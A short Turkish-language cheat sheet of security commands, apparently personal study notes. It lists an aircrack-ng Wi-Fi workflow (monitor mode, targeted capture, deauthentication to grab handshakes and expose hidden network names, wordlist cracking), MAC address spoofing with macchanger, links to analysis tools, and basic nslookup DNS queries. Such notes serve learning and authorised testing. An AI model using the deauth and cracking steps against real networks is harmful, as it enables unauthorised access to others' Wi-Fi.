# Command

wifi sec
airmon-ng start wlan0

airodump-ng wlan0mon

airodump-ng .....--bssid ....--chanel wlan0mon

#(cap dosyası yazalım istiyoruz)

airodump-ng .....--bssid ....--chanel wlan0mon -w/home/user/test 
(handshake yakalasın diye)

aireplay-ng --deauth 10 -a(bssid yani mac gir).. -c (client sta).. wlan0mon
^(gizli wifi adını çıkarma )

essid de isimi gösteriyor

cap dosyasını kullanma şekli de 
aircrack-ng ...capdosyası -w/home/user/wordlist.txt



mac adresi değiştirme (ether=mac adres)


Home | MAC Vendor Lookup Tool & API | MACVendors.com

ifconfig     
macchanger -s eth0
macchanger -m ..... (istediğin mac adresini .. gir ve yenisi o olsun)
macchanger -r (random bir mac ataması yapar)

VirusTotal - Home

Process Explorer - Sysinternals

Find out what files, registry keys and other objects processes have open, which DLLs they have loaded, and more.learn.microsoft.

SSL Checker Main page

IP Address Lookup | Geolocation (iplocation.net)

NSLOOKUP
Temel DNS Sorgusu

Bu komut, belirtilen domain_adı için DNS sorgusu yapar ve ilgili IP adresini döndürür. Örneğin, google.com için:

nslookup domain_adı
ÖR:
nslookup google.com

2. Belirli DNS Sunucusunu Kullanma

Bu komut, belirtilen dns_sunucu_adı'ni kullanarak domain_adı için DNS sorgusu yapar. Örneğin, google.com için Google'ın DNS sunucusu 8.8.8.8'i kullanarak:

nslookup domain_adı dns_sunucu_adı
ÖR:
nslookup google.com 8.8.8.8

3. PTR Kaydını Çözme (IP adresinden alan adını bulma)
   
Bu komut, belirtilen ip_adresi için PTR (Pointer) kaydını sorgular ve ilgili alan adını döndürür. Örneğin, 8.8.8.8 IP adresi için:

nslookup -type=ptr ip_adresi
ÖR:
nslookup -type=ptr 8.8.8.8

5. MX Kaydını Çözme (Mail Sunucusu Bilgisi)
   
Bu komut, belirtilen domain_adı için MX (Mail Exchange) kaydını sorgular ve ilgili mail sunucularının bilgisini döndürür. Örneğin, google.com için:

nslookup -type=mx domain_adı
ÖR:
nslookup -type=mx google.com
